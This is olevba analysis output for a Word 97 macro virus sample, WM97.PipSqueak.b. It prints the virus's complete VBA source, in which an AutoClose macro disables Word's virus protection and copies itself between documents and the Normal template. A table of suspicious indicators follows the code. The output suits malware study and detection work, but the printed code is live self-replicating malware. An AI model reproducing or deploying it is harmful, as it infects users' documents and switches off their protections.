olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip.b-66251f9c40ec54dec3615b4bc6db303029f2cbf7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip.b-66251f9c40ec54dec3615b4bc6db303029f2cbf7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO squeak.bas 
in file: Virus.MSWord.Pip.b-66251f9c40ec54dec3615b4bc6db303029f2cbf7 - OLE stream: 'Macros/VBA/squeak'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
Set norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents
If norm.Item("squeak").Name <> "squeak" Then
  Doc("squeak").Export "c:\squeak.dll"
  norm.Import ("c:\squeak.dll")
ElseIf Doc.Item("squeak").Name <> "squeak" Then
  norm("squeak").Export "c:\squeak.dll"
  Doc.Import ("c:\squeak.dll")
End If
If Day(Now) = 10 Then MsgBox "I would like you to meet WM97.PipSqueak", 0, "PipSqueak"
End Sub
'WM97.PipSqueak.b | Psyclone X | DVC
'Coded for smallest macro virus contest
'Please DO NOT spread
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |squeak.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

